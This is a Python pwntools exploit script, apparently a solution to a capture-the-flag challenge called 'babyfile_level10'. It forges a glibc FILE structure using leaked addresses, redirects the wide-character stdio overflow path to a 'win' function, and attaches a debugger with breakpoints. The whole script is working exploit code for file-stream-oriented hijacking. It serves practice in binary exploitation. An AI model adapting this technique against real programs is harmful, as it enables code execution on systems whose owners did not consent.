#!/usr/bin/env python3
from pwn import *

# Process setup
p = process('./babyfile_level10')
s = '''
b * fwrite
b * fwrite+184
b * __GI__IO_wdoallocbuf
b * _IO_wfile_overflow+41
'''
# Extract addresses
p.recvuntil(b'puts() within libc is: ')
puts_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'You are writing to: ')
fp_addr = int(p.recvline().strip(), 16)

log.info(f"puts: {hex(puts_addr)}")
log.info(f"fp: {hex(fp_addr)}")


win = 0x4018e6

payload = b'password'
payload += b'\x00' * 0x78
payload += p64(win)
payload += p64(fp_addr + 0xe0)  # Some other field
payload += b'\x00' * 0x10  # _codecvt
payload += p64(fp_addr + 0x18)  # _wide_data
payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct
payload += p64(puts_addr + 0x1649d8 - 0x38)
payload += b'\x41' * 0x18
payload += p64(fp_addr + 0x18)


gdb.attach(p, s)
time.sleep(2)
#pause()
p.send(payload)

p.interactive()

